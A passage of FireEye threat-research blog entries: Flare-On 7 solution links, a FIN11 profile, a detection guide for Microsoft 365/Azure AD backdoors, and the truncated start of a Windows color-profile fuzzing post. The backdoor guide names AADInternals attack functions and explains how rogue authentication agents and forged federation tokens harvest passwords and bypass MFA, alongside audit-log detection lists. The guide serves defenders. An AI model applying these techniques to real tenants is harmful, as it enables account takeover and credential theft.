    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7-solutions/picture3.png" alt="" /></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7-solutions/picture4.png" alt="" /></p>
 <p>All the binaries from this year’s challenge are now posted on the <a
    href="http://flare-on.com/files/Flare-On7_Challenges.zip">Flare-On
  website</a>. Here are the solutions written by each challenge author:</p>
 <ol> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge1-solution.pdf">SOLUTION
  #1</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge2-solution.pdf">SOLUTION
  #2</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge3-solution.pdf">SOLUTION
  #3</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge4-solution.pdf">SOLUTION
  #4</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge5-solution.pdf">SOLUTION
  #5</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge6a-solution.pdf">SOLUTION
  #6</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge7a-solution.pdf">SOLUTION
  #7</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge8-solution.pdf">SOLUTION
  #8</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge9-solution.pdf">SOLUTION
  #9</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge10-solution.pdf">SOLUTION
  #10</a></li> <li>
    <a
      href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/flareon7-challenge11-solution.pdf">SOLUTION
  #11</a></li> </ol>
http://www.fireeye.com/blog/threat-research/2020/10/flare-on-7-challenge-solutions.html2020-10-24T00:00:00.000Z2020-10-23T18:39:42.711ZFIN11: Widespread Email Campaigns as Precursor for Ransomware and Data Theftnoemail@noemail.orgGenevieve Stark<p>Mandiant Threat Intelligence recently promoted a threat cluster to a
  named FIN (or financially motivated) threat group for the first time
  since 2017. We have detailed FIN11's various tactics, techniques and
  procedures in a report that is available now by signing up for <a
    href="/content/fireeye-www/en_US/mandiant/advantage.html">Mandiant
    Advantage Free</a>.</p>
 <p>In some ways, FIN11 is reminiscent of APT1; they are notable not for
  their sophistication, but for their sheer volume of activity. There
  are significant gaps in FIN11’s phishing operations, but when active,
  the group conducts up to five high-volume campaigns a week. While many
  financially motivated threat groups are short lived, FIN11 has been
  conducting these widespread phishing campaigns since at least 2016.
  From 2017 through 2018, the threat group primarily targeted
  organizations in the financial, retail, and hospitality sectors.
  However, in 2019 FIN11’s targeting expanded to include a diverse set
  of sectors and geographic regions. At this point, it would be
  difficult to name a client that FIN11 hasn’t targeted.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/fin11/fin11services3.png" alt="" /></p>
 <p>Mandiant has also responded to numerous FIN11 intrusions, but we’ve
  only observed the group successfully monetize access in few instances.
  This could suggest that the actors cast a wide net during their
  phishing operations, then choose which victims to further exploit
  based on characteristics such as sector, geolocation or perceived
  security posture. Recently, FIN11 has deployed CLOP ransomware and
  threatened to publish exfiltrated data to pressure victims into paying
  ransom demands. The group’s shifting monetization methods—from
  point-of-sale (POS) malware in 2018, to ransomware in 2019, and hybrid
  extortion in 2020—is part of a larger trend in which criminal actors
  have increasingly focused on post-compromise ransomware deployment and
  data theft extortion.</p>
 <p>Notably, FIN11 includes a subset of the activity <a
    href="https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter">security
    researchers call TA505</a>, but we do not attribute TA505’s early
  operations to FIN11 and caution against using the names
  interchangeably. Attribution of both historic TA505 activity and more
  recent FIN11 activity is complicated by the actors’ use of criminal
  service providers. Like most financially motivated actors, FIN11
  doesn’t operate in a vacuum. We believe that the group has used
  services that provide anonymous domain registration, bulletproof
  hosting, code signing certificates, and private or semi-private
  malware. Outsourcing work to these criminal service providers likely
  enables FIN11 to increase the scale and sophistication of their operations.</p>
 <p>To learn more about FIN11’s evolving delivery tactics, use of
  services, post-compromise TTPs, and monetization methods, register
    for <a
    href="/content/fireeye-www/en_US/mandiant/advantage.html">Mandiant
    Advantage Free</a>. The full FIN11 report is also available through
  our <a href="https://intelligence.fireeye.com/sign_in">FireEye
    Intelligence Portal (FIP)</a>. Then for even more information,
  register for our <a
    href="https://www.brighttalk.com/webcast/7451/447347">exclusive
    webinar on Oct. 29</a> where Mandiant threat intelligence experts
  will take a deeper dive into FIN11, including its origins, tactics,
  and potential for future activity. </p>
http://www.fireeye.com/blog/threat-research/2020/10/fin11-email-campaigns-precursor-for-ransomware-data-theft.html2020-10-14T12:00:00.000Z2020-10-20T16:15:13.445ZDetecting Microsoft 365 and Azure Active Directory Backdoorsnoemail@noemail.orgMike Burns<p>Mandiant has seen an uptick in incidents involving Microsoft 365
  (M365) and Azure Active Directory (Azure AD). Most of these incidents
  are the result of a phishing email coercing a user to enter their
  credentials used for accessing M365 into a phishing site. Other
  incidents have been a result of password spraying, password stuffing,
  or simple brute force attempts against M365 tenants. In almost all of
  these incidents, the user or account was not protected by multi-factor
  authentication (MFA).</p>
 <p>These opportunistic attacks are certainly the most common form of
  compromise for M365 and Azure AD, and are usually the initial vector
  to establish persistence. During both incident response (IR)
  engagements and proactive cloud assessments we are often asked:</p>
 <ul> <li>What are some other types of attacks that Mandiant is seeing
    against M365 and Azure AD?</li> <li>Is it possible for an
    on-premises compromise to “vertically” move to M365 and Azure
  AD?</li> <li>If a global administrator account is compromised, is it
    possible to maintain persistence even after the compromised account
    has been detected, a password reset has occurred, and MFA has been
  applied?</li> </ul>
 <h4>AADInternals PowerShell Module</h4>
 <p>In some incidents, Mandiant has witnessed attackers utilizing a
  PowerShell module called <a
  href="https://o365blog.com/aadinternals/">AADInternals</a>, which can
  allow an attacker to vertically move from on-premises to Azure AD,
  establish backdoors, steal passwords, generate user security tokens,
  and bypass MFA protections. This PowerShell module has allowed
  attackers to maintain persistence in the tenant even after initial
  eradication efforts were conducted.</p>
 <p>To see this module in action and understand how it works, Dr.
  Nestori Syynimaa’s PSCONFEU 2020 presentation, <a
    href="https://www.youtube.com/watch?v=tJkjOnxcw6w">Abusing Azure
    Active Directory: Who would you like to be today?</a>, provides an
  in-depth overview of the module.</p>
 <p>To detect the use of AADInternals, it is important to understand how
  some of these attacks work. Once an understanding is established,
  abnormal usage can be detected through a combination of log analysis
  and host-based indicators.</p>
 <h4>Backdoor 1: Abusing Pass-Through Authentication</h4>
 <p>
  <i>Attacker Requirements</i></p>
 <ul> <li>Local Administrative Access to a server running Pass-through
  Authentication</li> </ul>
 <p style="margin-left: 40.0px;">Or</p>
 <ul> <li>M365 global administrator credentials</li> </ul>
 <p>The AADInternals PowerShell module contains a function called <span
  class="code">Install-AADIntPTASPY</span>. The function works by
  inserting itself as a man-in-the-middle within the Pass-through
  Authentication (PTA) process that occurs between Azure AD and the
  server running the PTA Agent in the on-premises environment. Commonly,
  the PTA Agent runs on the same on-premises server as Azure AD Connect
  (AAD Connect).</p>
 <p>When PTA is enabled, every logon that occurs against Azure AD gets
  redirected to the PTA Agent on-premises. The PTA Agent asks an
  on-premises Active Directory Domain Controller if a password is valid
  for an authenticating account. If valid, the PTA Agent responds back
  to Azure AD to grant the requestor access. Figure 1 provides the
  workflow of Pass-through Authentication and where AADInternals can
  intercept the request.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Pass-through Authentication workflow</span></p>
 <p>Once the function is running, every PTA attempt against Azure AD
  will be intercepted by the installed <span
  class="code">AADIntPTASpy</span> module. The module will record the
  user’s password attempt and reply back to Azure AD on behalf of the
  PTA Agent. This reply advises Azure AD the password attempt was valid
  and grants the user access to the cloud, even if the password is
  incorrect. If an attacker has implanted <span
  class="code">AADIntPTASpy</span>, they can log in as any user that
  attempts to authenticate using PTA—and will be granted access.</p>
 <p>Additionally, all password attempts that are registered by the <span
  class="code">AADIntPTASpy</span> module are recorded within a log file
  on the server (Default location: <span
  class="code">C:\PTASpy\PTASPy.csv</span>). Figure 2 shows how the log
  file can be decoded to reveal a user’s password in cleartext.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: PTASpy.csv decoded passwords</span></p>
 <p>Not only will this function allow an attacker to login as any user
  who authenticates via PTA, but it will also act as a repository for
  collecting user passwords who are legitimately logging into Azure AD.
  This could allow an attacker to pivot their attack to other areas of
  the network—or use these credentials against other internet accessible
  portals that may leverage single-factor authentication (e.g., VPN gateway).</p>
 <p>An attacker can use this module in one of two ways:</p>
 <p>
  <i>Method 1: On-Premises Compromise</i></p>
 <p>An attacker has gained access to an on-premises domain and is able
  to laterally move to the AADConnect / PTA Agent Server. From this
  server, an attacker can potentially leverage the AADInternals
  PowerShell module and invoke the <span
  class="code">Install-AADIntPTASpy</span> function.</p>
 <p>
  <i>Method 2: Cloud Compromise</i></p>
 <p>If an attacker has successfully compromised an Azure AD global admin
    account<b>, </b>an attack can be conducted from an attacker’s own
  infrastructure. An attacker can install a PTA Agent on a server they
  manage and register the agent using the compromised global
  administrator account (Figure 3).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Azure AD Portal—registered
    Pass-through Authentication agents</span></p>
 <p>Once registered with Azure AD, the rogue server will begin to
  intercept and authorize all login attempts. As with Method 1, this
  server can also be used to harvest valid credentials.</p>
 <h4>Backdoor 2: Abusing Identity Federation</h4>
 <p>
  <i>Attacker Requirements</i></p>
 <ul> <li>Local administrative access to AD and server running Active
    Directory Federation Services</li> </ul>
 <p style="margin-left: 40.0px;">Or</p>
 <ul> <li>M365 global administrator credentials</li> </ul>
 <p>Another method of authenticating to M365 is through the usage of
  federation services. When a M365 domain is configured as a federated
  domain, a trust is configured between M365 and an external identify
  provider. In many cases, this trust is established with an Active
  Directory Federation Services (ADFS) server for an on-premises Active
  Directory domain.</p>
 <p>Once a trust is established, when a user logs into M365 using a
  federated domain, their request is redirected to the external identify
  provider (ADFS) where their authentication is validated (Figure 4).
  Once validated, the ADFS server provides the user a security token.
  This token is then trusted by M365 and grants the access to the platform.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Microsoft 365 Federation
    Sign-in workflow</span></p>
 <p>AADInternals has a PowerShell function to craft security tokens,
  which mimics the ADFS authentication process. When providing the
  function a valid UserPrincipalName, Immutable ID and IssuerURI, an
  attacker can generate a security token as any user of the tenant.
  What’s even more concerning is that once this security token is
  generated, this can allow an attacker to bypass MFA.</p>
 <p>As with Backdoor 1, this attack can either be performed from a
  compromised on-premises environment or from an attacker’s own infrastructure.</p>
 <p>
  <i>Method 1: On-Premises Compromise</i></p>
 <p>Once an attacker has gained access to an on-premises domain with
  elevated access, they can begin to collect the required information to
  craft their own security tokens to backdoor into M365 as any user. An
  attacker will require:</p>
 <ul> <li>A valid UserPrincipalName and Immutable.<ul> <li>Both of these
        attributes can be pulled from the on-premises Active Directory
      domain.</li> </ul> </li> <li>IssuerURI of the ADFS server and ADFS
    Signing certificate.<ul> <li>This can be obtained from an ADFS
        server when directly logged into the server or remotely querying
        the server via an privileged account.</li> </ul> </li> </ul>
 <p>Once an attacker has collected the necessary information, using the
  AADInternals <span class="code">Open-AADIntOffice365Portal</span>
  command, a security token for the user can be generated granting an
  attacker access to M365 (Figure 5).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: AADInternals
    Open-AADIntOffice365Portal command</span></p>
 <p>
  <i>Method 2: Cloud Compromise</i></p>
 <p>If an attacker has a compromised an M365 Global Administrator
  account, using their own infrastructure, an attacker can use their
  administrative access to collect user information and reconfigure the
  tenant to establish their backdoor. In this method, an attacker will require:</p>
 <ul> <li>A valid UserPrincipalName and valid ImmutableId.<ul>
        <li>Figure 6 shows how the <span
        class="code">Get-MsolUser</span> command can obtain a user’s
        ImmutableId from Azure AD.</li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Get-MsolUser—list user UPN
    &amp; ImmutableId</span></p>
 <ul> <li>IssuerURI<ul> <li>This can be obtained by converting a managed
        domain to a federated domain. Figures 7 through 10 show how the
        AADInternals <span class="code">ConvertTo-AADIntBackdoor</span>
        command (Figure 8) can be used to allow attacker to register
        their own IssuerURI for a federated domain.</li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Get-msoldomain—list of
    registered domains and authentication</span></p>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture8.png" alt="" />
  <br /> <span class="type-XS">Figure 8:
    ConvertTo-AADIntBackdoor—convert domain to federated authentication</span></p>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Changed authentication method</span></p>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Azure AD Portal registered domains</span></p>
 <p style="margin-left: 80.0px;">Note: To not interrupt production and
  authentication with an existing federated domain (and to remain
  undetected), an attacker may opt to register a new domain with the tenant.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture11.png" alt="" />
  <br /> <span class="type-XS">Figure 11: AADInternals
    Open-AADIntOffice365Portal Command using new Federated domain</span></p>
 <p>Once an attacker has properly configured the tenant, using the
  ImmutableId of any user, a security token can be generated by
  executing the <span class="code">Open-AADIntOffice365Portal</span>
  command (Figure 11). This will allow an attacker to login as that user
  without the need for a valid certificate or a legitimate IssuerURI.</p>
 <p>Fortunately for defenders, this method will generate a number of
  events in the unified audit log, which can be leveraged for monitoring
  and alerting.</p>
 <h4>Mitigation and Detection</h4>
 <p>Once persistence is established, it can be extremely difficult to
  detect login activity that is utilizing one of the previously
  described methods. In lieu of this, it is recommended to monitor and
  alert on M365 unified audit logs and Azure AD sign-in activity to
  detect anomalous activity.</p>
 <h4>Detection in FireEye Helix</h4>
 <p>Being that Mandiant has seen this methodology being used in the
  wild, we felt it was necessary to build these detections into our
  FireEye Helix security platform. Helix engineers have created sever
  new detection rules that monitor for detectable activity of an
  attacker making use of the AADInternals PowerShell module.</p>
 <p>The following five rules will monitor a server’s event logs and
  alert upon the installation and usage of the AADInternals PowerShell
  module (Figure 12). The detection of these activities could be high
  fidelity alerts that an attacker is preparing to configure backdoors
  into M365 and Azure AD environments.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture12.png" alt="" />
  <br /> <span class="type-XS">Figure 12: AADInternals Helix rules</span></p>
 <p>If an attacker has successfully configured a backdoor using
  AADInternals, Helix will alert upon the following events registered in
  the Office 365 unified audit log and Azure Activity Log as indication
  of a possible event (Figure 13 and Figure 14). It is important to note
  that these alerts could be triggered upon legitimate administrator
  activity. When responding to these alerts, first check with your M365
  and Azure AD administrator to verify the activity before raising a
  security event.<b></b></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Office 365 and Azure Helix rules</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture14.png" alt="" />
  <br /> <span class="type-XS">Figure 14: PTA Connector Registered alert description</span></p>
 <h4>Hunting for Backdoors in M365 Unified Audit Logs and Azure AD Logs</h4>
 <p>If you suspect a global administrator account was compromised and
  you want to review Azure AD for indicators of potential abuse, the
  following should be reviewed (note that these same concepts can be
  used for proactive log monitoring):</p>
 <ul> <li>From Azure AD Sign-ins logs, monitor logon activity from
    On-Premises Directory Synchronization Service Accounts. This account
    is used by the Azure AD Connect service (Figure 15).</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture15.png" alt="" />
  <br /> <span class="type-XS">Figure 15: Azure AD Sign-ins</span></p>
 <ul> <li>Baseline the IP addresses used by this account and make sure
    the IPs match those assigned to the on-premises WAN infrastructure.
    If the attacker has configure a PTA Agent on their own
    infrastructure, seeing an IP that does not match your baseline could
    be an indicator that a rogue PTA Agent has been configured by the
    attacker (Figure 16).</li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture16.png" alt="" />
  <br /> <span class="type-XS">Figure 16: Azure AD Sign-in
    logs—On-Premises Directory Synchronization Services account</span></p>
 <p style="margin-left: 80.0px;">From Azure AD Sign-ins, monitor and
  baseline Azure AD Sign-ins to the Azure AD Application Proxy
  Connector. Make sure to validate username, IP and location.</p>
 <p style="margin-left: 80.0px;">These events are typically only
  generated when a new PTA agent is connected to the tenant. This could
  be an indicator that an attacker has connected a rogue PTA server
  hosted on an attacker’s infrastructure (Figure 17).</p>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture17.png" alt="" />
  <br /> <span class="type-XS">Figure 17: Azure AD Sign-in logs—Azure AD
    Application Proxy Connector</span></p>
 <p style="margin-left: 80.0px;">If using Azure Sentinel, this event
  will also be registered in the Azure AuditLogs table as a “<span
    class="code">Register Connector</span>” OperationName (Figure 18).</p>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture18.png" alt="" />
  <br /> <span class="type-XS">Figure 18: Register Connector—Azure
    Sentinel logs</span></p>
 <ul> <li>In the Azure Management Portal under the Azure AD Connect
    blade, review all registered servers running PTA Agent. The
    Authentication Agent and IP should match your infrastructure (Figure
      19).<ul> <li>Log in to https://portal.azure.com<ul> <li>Select
            Azure AD Connect &gt; Pass-through Authentication</li> </ul>
      </li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture19.png" alt="" />
  <br /> <span class="type-XS">Figure 19: Azure Active Directory
    Pass-through Authentication agent status</span></p>
 <ul> <li>Monitor and alert for &quot;Directory Administration
    Activity&quot; in Office 365 Security &amp; Compliance Center’s
    unified audit log. When an attacker is able to create a domain
    federation within a compromised cloud tenant, and link this to
    attacker-owned infrastructure, this will generate activity in the
    log (Figure 21).<ul>
        <li>https://Protections.office.com/unifiedauitlog &gt; Audit Log
      Search</li> <li>Select Directory Administration Activates category
        to select all activities</li> <li>Create New Alert Policy
        (Figure 20)</li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture20a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 20: Unified Audit Log &gt; Create new alert policy</span></p>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture21a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 21: Unified Audit Log filtered for domain related events</span></p>
 <ul> <li>Using Azure Sentinel, more granular Directory Administration
    Activities can be modified for suspicious activity. This includes
    additions, deletions and modifications of domains and their
    authentication settings (Figure 22).<ul> <li>Monitoring for <span
        class="code">OfficeActivity</span> Operations in Azure Sentinel
        can allow an organization to validate if this is normalized
        activity or if an attacker is working on setting up a backdoor
        for PTA or federation.<ul> <li>Table: OfficeActivity<ul>
                <li>Operation: Set-AcceptedDomain</li> <li>Operation:
              Set-MsolDomainFederationSettings</li> <li>Operation:
              Add-FederatedDomain</li> <li>Operation: New-Accepted
              Domain</li> <li>Operation: Remove-Accepted Domain</li>
                <li>Operation: Remove-FederatedDomain</li> </ul> </li>
        </ul> </li> </ul> </li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture22a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 22: OfficeActivity Operations Azure Sentinel logs</span></p>
 <h4>Detection On-Premises</h4>
 <p>If an attacker is able to compromise on-premises infrastructure and
  access a server running AD Connect or ADFS services with the intention
  of leveraging a tool such as AADInternals to expand the scope of their
  access to include cloud, timely on-premises detection and containment
  is key. The following methods can be leveraged to ensure optimized
  visibility and detection for the scope of activities described in this post:</p>
 <ul> <li>Treat ADFS and Azure AD Connect servers as <a
      href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#:~:text=Tier%200%20%2D%20Direct%20Control%20of,all%20the%20assets%20in%20it">Tier
      0 assets</a>.<ul> <li>Use a dedicated server for each. Do not
        install these roles and server in addition to other. All too
        often we are seeing Azure AD Connect running on a file
      server. </li> </ul> </li> <li>Ensure <a
      href="/content/fireeye-www/en_US/blog/threat-research/2016/02/greater_visibilityt.html">PowerShell
    logging</a> is optimized on AD Connect and ADFS servers</li>
    <li>Review Microsoft-Windows-PowerShell/Operational logs on ADFS and
    AADConnect Server Logs.<ul> <li>If PowerShell logging is enabled,
        search for Event ID 4101. This event ID will record the event
        where AADInternals was installed (Figure 23).</li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture23a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 23: EventID 410—Installed Module</span></p>
 <ul> <li>Additionally, with this logging enabled, you will be able to
    review the PowerShell commands used by an attacker.<ul> <li>In
        PowerShell, run Get-Module -All and look for the presence of
        AADInternals (Figure 24).</li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture24.png" alt="" />
  <br /> <span class="type-XS">Figure 24: Get-Module command to list
    installed modules</span></p>
 <ul> <li>Alert for the presence of C:\PTASpy and
      C:\PTASpy\PTASpy.csv.<ul> <li>This is the default location of the
        log file that contains records of all the accounts that were
        intercepted by the tool. Remember, an attacker may also use this
        to harvest credentials, so it is important to reset the password
        for these accounts (Figure 25).</li> </ul> </li> </ul>
 <p style="margin-left: 80.0px;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/azure365/picture25.png" alt="" />
  <br /> <span class="type-XS">Figure 25: PTASpy.csv log activity</span></p>
 <h4>Mitigations</h4>
 <p>In order for this attack to be successful, an attacker must gain
  administrative privileges on a server running Azure AD Connect and/or
  gain global administrator rights within M365. Simple practices such as
  limiting and properly protecting global administrator accounts as well
  as properly protecting Tier 0 assets can greatly reduce the risk of an
  attacker successfully using the AADInternals PowerShell against your organization.</p>
 <ul> <li>
    <a
      href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access">Limit
      or restrict access</a> to Azure AD Connect servers.<ul> <li>Any
        server acting as an identity provider or facilitating identity
        federation should be treated as a Tier 0 asset.</li> </ul> </li>
    <li>Create separate dedicated <a
      href="https://docs.microsoft.com/en-us/microsoft-365/enterprise/protect-your-global-administrator-accounts?view=o365-worldwide">global
      administrator accounts</a>.<ul> <li>Global administrators should
        be cloud-only accounts.</li> <li>These accounts should not
        retain any licensing.</li> </ul> </li> <li>Implement MFA on all
    accounts: admins, users and services.<ul> <li>If a particular
        account cannot use MFA, apply a conditional access rule that
        limits its logon to a trusted network. This works particularly
        well for service accounts.  </li> </ul> </li> <li>Establish a
    roadmap to <a
      href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authentication">block
      legacy authentication</a>.</li> <li>Limit which accounts are <a
      href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-configure-filtering#filtering-options">synced
      from on-premises to the cloud</a>.<ul> <li>Do not sync privileged
        or service accounts to the cloud.</li> </ul> </li> <li>Use Azure
      <a
      href="https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles">administrative
      roles</a>.<ul> <li>Not everybody or everything needs to be a
        global admin to administer the environment.</li> </ul> </li>
    <li>Use <a
      href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-password-hash-synchronization">password
      hash sync</a> over Pass-through Authentication.<ul> <li>Many
        organizations are reluctant to sync their password to Azure AD.
        The benefits from this service greatly outweigh the risks. Being
        able to use global and custom <a
          href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-password-ban-bad">banned
          passwords lists</a>, for both the <a
          href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-hybrid-identity">cloud
          and on-premises</a>, is a tremendous benefit.</li> </ul> </li>
    <li>Forward all M365 unified audit logs and Azure logs to a SIEM and
    build detections.<ul> <li>Ensure you are forwarding the logs
        recommended in this post and building the appropriate detections
        and playbooks within your security operations teams.</li>
        <li>Specifically monitor for:<ul> <li>Set-AcceptedDomain</li>
          <li>Set-MsolDomainFederationSettings</li>
          <li>Add-FederatedDomain</li> <li>New-Accepted Domain<br />
          </li> <li>Remove-Accepted Domain<br /> </li>
          <li>Remove-FederatedDomain</li> </ul> </li> </ul> </li>
    <li>Periodically review all identity providers and custom domains
    configured in the M365 tenant.<ul> <li>If an attacker is successful
        at gaining global administrative privileges, they may choose to
        add their own identity provider and custom domain to maintain
      persistence.</li> </ul> </li> </ul>
 <h4>Acknowledgements</h4>
 <p>I want to give a special thanks to Daniel Taylor, Roberto Bamberger
  and Jennifer Kendall at Microsoft for collaborating with Mandiant on
  the creation of this blog post.</p>
http://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html2020-09-30T16:45:00.000Z2020-09-30T16:43:44.123ZFuzzing Image Parsing in Windows, Part One: Color Profilesnoemail@noemail.orgDhanesh Kizhakkinan<p>Image parsing and rendering are basic features of any modern
  operating system (OS). Image parsing is an easily accessible attack
  surface, and a vulnerability that may lead to remote code execution or
  information disclosure in such a feature is valuable to attackers. In
  this multi-part blog series, I am reviewing Windows OS’ built-in image
  parsers and related file formats: specifically looking at creating a
  harness, hunting for corpus and fuzzing to find vulnerabilities. In
  part one of this series I am looking at color profiles—not an image
  format itself, but something which is regularly embedded within images. </p>
 <h4>What is an ICC Color Profile?</h4>
 <p>Wikipedia provides a more-than-adequate <a
    href="https://en.wikipedia.org/wiki/ICC_profile">description of ICC
    color profiles</a>: <i>&quot;In color management, an ICC profile is
    a set of data that characterizes a color input or output device, or
    a color space, according to standards promulgated by the
    International Color Consortium (ICC). Profiles describe the color
    attributes of a particular device or viewing requirement by defining
    a mapping between the device source or target color space and a
    profile connection space (PCS). This PCS is either CIELAB (L*a*b*)
    or CIEXYZ. Mappings may be specified using tables, to which
    interpolation is applied, or through a series of parameters for transformations.</i>”</p>
 <p>In simpler terms, an ICC color profile is a binary file that gets
  embedded into images and parsed whenever ICC supported software
  processes the images. </p>
 <h4>Specification</h4>
 <p>The <a
    href="http://www.color.org/specification/ICC1v43_2010-12.pdf ">ICC
  specification</a> is around 100 pages and should be easy to skim
  through. Reading through specifications gives a better understanding
  of the file format, different types of color profiles, and math behind
  the color transformation. Furthermore, understanding of its file
  format internals provides us with information that can be used to
  optimize fuzzing, select a good corpus, and prepare fuzzing dictionaries.</p>
 <h4>History of Color Management in Windows</h4>
 <p>Windows started to ship Image Color Management (ICM) version
  1.0 on Windows 95, and version 2.0 beginning with Windows 98 onwards.
  A major overhaul to Windows Color System (WCS) 1.0 happened in Windows
  Vista onwards. While ICC color profiles are binary files, WCS color
  profiles use XML as its file format. In this blog post, I am going to
  concentrate on ICC color profiles.</p>
 <p>Microsoft has a list of <a
    href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wcs/alphabetical-list-of-all-wcs-functions ">supported
    Windows APIs</a>. Looking into some of the obviously named APIs,
  such as <a
  href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wcs/opencolorprofile">OpenColorProfile</a>, we
  can see that it is implemented in MSCMS.dll. This DLL is a generic
  entry point and supports loading of Microsoft’s Color Management
  Module (CMM) and third-party CMMs such as Adobe’s CMM. Microsoft’s
  CMM—the ICM—can be found as ICM32.dll in system32 directory. </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/image-fuzzing/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: ICM32</span></p>
 <p>Windows’ CMM was written by a third-party during the Windows 95 era
  and still ships more or less with the same code (with security fixes
  over the decades). Seeing such an old module gives me some hope of
  finding a new vulnerability. But this is also a small module that may
  have gone through multiple rounds of review and fuzzing:
  both by internal product security teams and by external researchers,
  reducing my hopes to a certain degree. Looking for any recent
  vulnerabilities in ICM32, we can see multiple bugs from 2017-2018 by
  Project Zero and ZDI researchers, but then relative silence from 2019 onwards.</p>
 <h4>Making a Harness</h4>
 <p>Although there is a list of ICM APIs in MSDN, we need to find an API
  sequence used by Windows for any ICC related operations. One of the
  ways to find our API sequence is to search a disassembly of Windows
